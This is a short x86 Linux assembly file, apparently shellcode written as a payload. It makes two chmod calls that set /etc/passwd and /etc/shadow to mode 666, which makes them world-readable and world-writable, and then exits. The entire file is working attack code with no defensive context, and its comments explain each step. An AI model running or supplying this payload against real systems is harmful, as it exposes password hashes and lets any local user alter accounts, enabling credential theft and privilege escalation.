; 

global _start

section .text

	_start:        
		
           	xor    eax,eax  	; eax=NULL
        	mov    cx,0x1b6		; mode=666(octal value)		
        	push   eax		; NULL
        	push   0x64777373	; dwss
         	push   0x61702f2f	; ap//
         	push   0x6374652f	; cte/
         	mov    ebx,esp		; address of /etc//passwd
         	mov    al,0xf		; chmod syscall no
         	int    0x80		; informs kernel for execution
         	
		xor    eax,eax		; eax=NULL
         	push   eax		; NULL
         	push   0x776f6461	; woda
         	push   0x68732f2f	; hs//
         	push   0x6374652f	; cte/
         	mov    ebx,esp		; address of /etc//shadow
         	mov    al,0xf		; chmod syscall no
         	int    0x80		; informs kernel for execution
         	
		xor    eax,eax		; eax=NULL
         	inc    eax		; exit syscall no
         	int    0x80		; informs kernel for execution
	
